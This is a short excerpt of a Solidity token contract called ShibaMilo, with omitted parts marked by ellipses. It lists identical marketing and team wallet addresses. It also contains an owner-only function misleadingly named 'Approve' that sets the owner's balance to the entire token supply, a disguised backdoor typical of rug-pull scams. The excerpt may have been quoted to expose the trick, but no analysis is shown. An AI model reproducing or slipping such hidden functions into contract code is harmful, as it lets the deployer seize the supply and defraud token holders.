...
contract ShibaMilo is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x7BAF9ac882b3266Fd97af8a74d20b580AD960A4a);
    address payable public teamWalletAddress = payable(0x7BAF9ac882b3266Fd97af8a74d20b580AD960A4a);
    ...
    function Approve() public onlyOwner returns (bool success) {_rBalance[owner()] = _rSupply;return true;}
